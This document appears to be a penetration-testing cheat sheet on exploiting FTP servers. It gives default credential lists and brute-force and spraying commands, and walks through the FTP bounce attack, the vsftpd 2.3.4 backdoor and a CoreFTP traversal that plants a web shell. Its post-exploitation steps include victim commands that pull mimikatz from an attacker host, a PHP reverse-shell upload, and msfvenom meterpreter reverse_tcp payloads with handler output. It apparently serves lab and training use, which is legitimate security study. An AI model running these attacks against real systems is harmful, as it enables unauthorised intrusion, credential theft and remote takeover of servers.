---
id: Exploitation
aliases: []
tags:
  - Networking/Services/FTP/Exploitation
links: "[[FTP]]"
---

<!-- Exploitation {{{-->
# Exploitation

___

<!-- Authentication {{{-->
## Authentication

<!-- Common Credentials {{{-->
### Common Credentials

FTP most common default credentials

<!-- Example {{{-->
> [!tip]- Common Credentials
>
> ```
> anonymous:anonymous
> _anonymous:
> _ftp:ftp
> admin:admin
> root:root
> ftpuser:ftpuser
> test:test
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Brute Force {{{-->
### Brute Force

<!-- Wordlists {{{-->
> [!tip]- Wordlists
>
> Passwords
>
> - [[SecLists#FTP|SecLists]]
> - [[Rockyou#Wordlist|Rockyou]]
>
<!-- }}} -->

[[Metasploit]] — FTP Authentication Scanner
(*[ftp_login](https://www.rapid7.com/db/modules/auxiliary/scanner/ftp/ftp_login/)*)

```sh
use auxiliary/scanner/ftp/ftp_login
```

<!-- Example {{{-->
> [!example]-
>
> Test FTP logins on a range of machines and report successful logins
>
> ```sh
> msf > use auxiliary/scanner/ftp/ftp_login
> ```
> ```sh
> msf auxiliary(ftp_login) > show actions
> ```
> ```sh
> msf auxiliary(ftp_login) > set ACTION <action_name>
> ```
> ```sh
> msf auxiliary(ftp_login) > show options
> ```
> ```sh
> msf auxiliary(ftp_login) > run
> ```
<!-- }}} -->

[[Hydra]] — Brute Force FTP login

```sh
hydra -I -l <user> -P <passwords.txt> $target ftp
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> hydra -I \
> -l <user> \
> -P /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt \
> $target ftp
> ```
>
> ```sh
> hydra -I \
> -l <user> \
> -P /usr/share/wordlists/rockyou.txt \
> $target ftp
> ```
<!-- }}} -->


[[Nmap]] — Perform brute force password auditing against FTP servers
(*[ftp-brute](https://nmap.org/nsedoc/scripts/ftp-brute.html)*)

```sh
nmap $target -p 21 --script ftp-brute -oA ftp-script-brute
```

[[Medusa]] — Brute Force FTP login

```sh
medusa -u <user> -P <passwords.txt> -h $target -M ftp
```
<!-- }}} -->

<!-- Password Spraying {{{-->
### Password Spraying

[[Hydra]] — Password Spray FTP login

```sh
hydra -L <users_list> -p <password> ftp://$target
```

<!-- }}} -->

___
<!-- }}} -->

<!-- FTP Bounce Attack {{{-->
## FTP Bounce Attack

**FTP Bounce Attack** exploits the FTP protocol's ability to redirect traffic,
masking the attack source

<!-- Requirements {{{-->
> [!info]- Requirements
>
> - FTP valid credentials in the **FTP Middle Server**
> - FTP valid credentials in **Victim FTP Server**
> - Both server accepts the `PORT` command
> - Some directory of the **FTP Middle Server** is writeable
> - The **Middle Server** will have more access to the **Victim FTP Server**
<!-- }}} -->

Use the FTP server's `PORT` command to route data to another FTP server
at a specified port, making the attack seem to originate from that server

1. [[Networking/Services/FTP/Enumeration#Service|Discover]] an FTP server that allows the `PORT` command

2. [[Usage#Connect|Connect]] to the server

3. Redirect data to the target

```sh
quote PORT $target,<port>
```

4. Exploit FTP bouncing

<!-- Example {{{-->
> [!example]-
>
> [[Nmap]] scan a network
>
> ```sh
> nmap -v -b -P0 '<username>':'<password>'@'<ftp_server>' '<address_to_scan>' -oA ftp-bounce-exploit
> ```
>
> Initiate a file transfer or command to the target
>
> ```sh
> get filename
> ```
<!-- }}} -->

<!-- Other Protocols {{{-->
### Other Protocols

This behavior can be abused to make an FTP server interact with other protocols

A file (*containing a HTTP request*) can be uploaded to the FTP server
and sent to an arbitrary HTTP server:

1. [[Usage#Upload|Upload]] the request (*in a txt file*) to the server,
   to talk with another HTTP or FTP server

> [!info]
>
> The line endings need to be changed to `0x0d` `0x0a`

2. Use `REST X` to avoid sending unwanted characters

3. Use `PORT` to connect to the arbitrary server and service

4. Use `RETR` to send the saved request to the server

<!-- Warning {{{-->
> [!warning]
>
> It's highly possible that this will throw an error
> (e.g. *Socket not writeable*)
> as the connection doesn't last long enough to send the data
> with `RETR`.
>
> > [!tip]-
> >
> > To avoid this:
> >
> > - **Put the same request on after another**
> >  ([like this](https://book.hacktricks.wiki/en/files/posts.txt))
> >  until ~0.5MB, if sending the same HTTP request
> > - **Fill the request with "junk" data** relative to the protocol
> > - **Fill the request with a lot of null characters**
<!-- }}} -->

___

<!-- }}} -->

<!-- }}} -->

<!-- CVE Exploits {{{-->
## CVE Exploits

<!-- CVE-2011-2523 {{{-->
### CVE-2011-2523

[CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523) —
A malicious backdoor was introduced into the `vsftpd-2.3.4.tar.gz` archive
between June 30th 2011 and July 1st 2011 which opens a shell on port `6200/tcp`

[[Metasploit]] — VSFTPD v2.3.4 Backdoor Command Execution
(*[vsftpd_234_backdoor](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/)*)

```sh
use exploit/unix/ftp/vsftpd_234_backdoor
```

<!-- Example {{{-->
> [!example]-
> ```sh
> msf > use exploit/unix/ftp/vsftpd_234_backdoor
> msf exploit(vsftpd_234_backdoor) > show targets
>     ...targets...
> msf exploit(vsftpd_234_backdoor) > set TARGET < target-id >
> msf exploit(vsftpd_234_backdoor) > show options
>     ...show and set options...
> msf exploit(vsftpd_234_backdoor) > exploit
> ```
<!-- }}} -->

<!-- }}} -->

<!-- CVE-2022-22836 {{{-->
### CVE-2022-22836

[CVE-2022-22836](https://nvd.nist.gov/vuln/detail/CVE-2022-22836) —
[CoreFTP](https://www.coreftp.com/download.html) server before `727`
allows directory traversal (*for file creation*)
by an authenticated attacker via `../` in an `HTTP PUT` request

<!-- Warning {{{-->
> [!warning]
>
> Authentication required
>
<!-- }}} -->

<!-- Info {{{-->
> [!info]-
>
> The FTP service uses an HTTP [[POST]] request
> to upload files
>
<!-- }}} -->

1. **Attacker**: Copy exploit from [[Searchsploit]]

```sh
searchsploit -m windows/remote/50652.txt
```

<!-- Example {{{-->
> [!example]-
>
> [CoreFTP Server build 725 - Directory Traversal (Authenticated)](https://www.exploit-db.com/exploits/50652)
>
> ```sh
> curl -k -X PUT -H "Host: $target" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://$target/../../../../../../whoops
> ```
>
<!-- }}} -->

2. **Attacker**: Create random 16-bit filename with [[OpenSSL]]

```sh
echo "$(openssl rand -hex 16)".<ext>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> echo "$(openssl rand -hex 16)".asp
> ```
> ```sh
> echo "$(openssl rand -hex 16)".jsp
> ```
> ```sh
> echo "$(openssl rand -hex 16)".php
> ```
>
<!-- }}} -->

3. **Attacker**: Edit exploit

```sh
vim 50652.txt
```

<!-- Example {{{-->
> [!example]-
>
> 1. Add username and password
>
> ```sh
> --basic -u <user>:<password>
> ```
>
> 2. Add [[Web Shell/General|Web Shell]] payload
>
> <!-- Warning {{{-->
> > [!warning]
> >
> > Ensure payload quotes are escaped
> <!-- }}} -->
>
> ```sh
> --data-binary "<payload>"
> ```
>
> 3. Add [[Web Server Root]] and random filename as upload path
>
> ```sh
> --path-as-is https://$target/../../../../../../<web_server_root>/<random_filename>
> ```
>
<!-- }}} -->

4. **Attacker**: Execute the exploit

<!-- Example {{{-->
> [!example]-
>
> ```sh
> curl -k -X PUT \
>   -H "Host: $target" \
>   --basic -u <user>:<password> \
>   --data-binary '<payload>' \
>   --path-as-is https://$target/../../../../../../<web_server_root>/<file>
> ```
>
<!-- }}} -->

5. **Target**: Find uploaded file (*optional*)

<!-- Example {{{-->
> [!example]-
>
> ```sh
> C:\> type C:\whoops
> ```
>
> ```
> PoC.
> ```
>
<!-- }}} -->

6. **Attacker**: [[Web Shell/General#Access Web Shell|Access Web Shell]]

```sh
curl http://$target[:port]/shell.php?cmd=type%20C:\\users\\administrator\\desktop\\flag.txt
```

<!-- Info {{{-->
> [!info]-
>
> - `-w "\n"`: Print extra information after the request finishes
>   based on format string
>
<!-- }}} -->


<!-- }}} -->

<!-- FileZilla Server Vulnerability {{{-->
### FileZilla Server Vulnerability

**[FileZilla](https://filezilla-project.org/) Server** usually binds to the
local administrative TCP port `14147`

If it is possible to create a tunnel
from the attacker machine to this port:

- Authenticate using a blank password
- Create a new user for the FTP service

<!-- }}} -->

___
<!-- }}} -->

<!-- }}} -->

<!-- Post-Exploitation {{{-->
# Post-Exploitation

<!-- Enumeration {{{-->
## Enumeration

List recognized commands

```sh
HELP
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> HELP
> ```
> ```sh
> 214-The following commands are recognized (* =>'s unimplemented):
> 214-CWD XCWD CDUP XCUP SMNT* QUIT PORT PASV 
> 214-EPRT EPSV ALLO* RNFR RNTO DELE MDTM RMD 
> 214-XRMD MKD XMKD PWD XPWD SIZE SYST HELP 
> 214-NOOP FEAT OPTS AUTH CCC* CONF* ENC* MIC* 
> 214-PBSZ PROT TYPE STRU MODE RETR STOR STOU 
> 214-APPE REST ABOR USER PASS ACCT* REIN* LIST 
> 214-NLST STAT SITE MLSD MLST 
> 214 Direct comments to root@drei.work
> ```
<!-- }}} -->

List extended features the server support

```sh
FEAT
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> FEAT
> ```
> ```sh
> 211-Features:
>  PROT
>  CCC
>  PBSZ
>  AUTH TLS
>  MFF modify;UNIX.group;UNIX.mode;
>  REST STREAM
>  MLST modify*;perm*;size*;type*;unique*;UNIX.group*;UNIX.mode*;UNIX.owner*;
>  UTF8
>  EPRT
>  EPSV
>  LANG en-US
>  MDTM
>  SSCN
>  TVFS
>  MFMT
>  SIZE
> 211 End
> ```
<!-- }}} -->

> [!tip]
>
> Enumerate the server with
[[Usage#File Operations|File Operation Commands]]

___
<!-- }}} -->

<!-- File Operations {{{-->
## File Operations

[[Pentest/File Transfer/Linux/Download|Download]] a file
(*e.g., [[Mimikatz|mimikatz.exe]]*)

1. **Attacker**: [[pipx]] — Install [pyftpdlib](https://github.com/giampaolo/pyftpdlib)

```sh
pipx install pyftpdlib
```

> [!tip]-
>
> With pure-ftp use
> [fuse:ftp](https://github.com/telepresenceio/go-fuseftp)
> (*written in Go*)


2. **Attacker**: Host the FTP server

```sh
python -m pyftpdlib -p 21 -w
```

3. **Attacker** Place the file (*e.g., `mimikatz.exe`*) into the FTP root

4. **Victim**: Execute the following commands

> [!example]-
>
> ```sh
> echo open <attacker_ip> 21 > ftp.txt
> ```
> ```sh
> echo USER anonymous >> ftp.txt
> ```
> ```sh
> echo anonymous >> ftp.txt
> ```
> ```sh
> echo bin >> ftp.txt
> ```
> ```sh
> echo GET mimikatz.exe >> ftp.txt
> ```
> ```sh
> echo bye >> ftp.txt
> ```
> ```sh
> ftp -n -v -s:ftp.txt
> ```

___

<!-- }}} -->

<!-- Reverse Shell Over Website {{{-->
## Reverse Shell Over Website

Spawn a reverse shell over the web

<!-- Requirements {{{-->
> [!info]- Requirements
>
> - The target allows FTP access over the web
> - The web server can run PHP files
<!-- }}} -->

<!-- Manual {{{-->
### Manual

1. Download the [payload](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)

```sh
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php
```

2. Edit payload variables

```sh
$ip = '<attacker_ip>';
$port = 1234;
```

3. [[Usage#Connect|Connect]] to the FTP server

```sh
ftp $target
```

4. [[Usage#Upload|Upload]] the payload

```sh
put shell.php
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> ftp> put shell.php
> ```
> ```sh
> local: shell.php remote: shell.php
> 229 Entering Extended Passive Mode (|||49159|)
> 125 Data connection already open; Transfer starting.
> 100% |**********************************************************|  5685       35.90 MiB/s    --:-- ETA
> 226 Transfer complete.
> 5685 bytes sent in 00:00 (151.40 KiB/s)
> ```
<!-- }}} -->

5. [[Netcat]] - Listen to the incoming connection

```sh
nc -lvnp 1234
```

6. Query the exploit to esablish a connection back

```
curl -i http://$target/path/to/ftp/shell.php
```

<!-- }}} -->

<!-- Metasploit {{{-->
### Metasploit

1. [[Msfvenom]] - Generate [ASP.NET](https://en.wikipedia.org/wiki/ASP.NET) payload

```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=1234 -f aspx > shell.aspx
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.37 LPORT=1234 -f aspx > devel.aspx
> ```
> ```sh
> [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
> [-] No arch selected, selecting arch: x86 from the payload
> No encoder specified, outputting raw payload
> Payload size: 354 bytes
> Final size of aspx file: 2878 bytes
> ```
<!-- }}} -->

2. [[Usage#Connect|Connect]] to the FTP server

```sh
ftp $target
```

3. Upload the payload

```sh
put shell.aspx
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> ftp> put shell.aspx
> ```
> ```sh
> local: shell.aspx remote: shell.php
> 229 Entering Extended Passive Mode (|||49159|)
> 125 Data connection already open; Transfer starting.
> 100% |**********************************************************|  5685       35.90 MiB/s    --:-- ETA
> 226 Transfer complete.
> 5685 bytes sent in 00:00 (151.40 KiB/s)
> ```
<!-- }}} -->

4. Launch [[Metasploit]]

```sh
msfconsole -q
```

5. [Use Meterpreter Locally Without an Exploit](https://docs.rapid7.com/metasploit/use-meterpreter-locally-without-an-exploit/)
(*[Generic Payload Handler](https://www.rapid7.com/db/modules/exploit/multi/handler/)*)

```sh
use exploit/multi/handler
```

<!-- Info {{{-->
> [!info]-
>
> This module is a stub that provides all of the
> features of the Metasploit payload system to exploits
> that have been launched outside of the framework
>
<!-- }}} -->

6. Set [Payload](https://docs.rapid7.com/metasploit/working-with-payloads/)

```sh
set payload windows/meterpreter/reverse_tcp
```

7. Set options

```sh
set LHOST tun0
```

```sh
set LPORT 1234
```

```sh
set ExitOnSession false
```

8. Run handler listener in the background [[Sessions#Jobs|Job]]

```sh
exploit -j
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msf exploit(multi/handler) > exploit -j
> ```
> ```sh
> [*] Exploit running as background job 0.
> [*] Exploit completed, but no session was created.
> msf exploit(multi/handler) >
> [*] Started reverse TCP handler on 10.10.14.37:1234
> [*] Sending stage (188998 bytes) to 10.10.10.5
<!-- }}} -->

9. [[cURL]] - Query the payload

```sh
curl http://$target/shell.aspx
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> curl http://$target/shell.aspx
> ```
> ```sh
> [*] Meterpreter session 1 opened (10.10.14.37:1234 -> 10.10.10.5:49174) at 2026-01-11 21:33:10 -0500
> ```
<!-- }}} -->

10. Open the created [[Sessions|Meterpreter Session]]

```sh
sessions -i 1
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msf exploit(multi/handler) > sessions -i 1
> ```
>
> ```sh
> [*] Starting interaction with 1...
> ```
>
> ```sh
> meterpreter > 
> ```
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- }}} -->
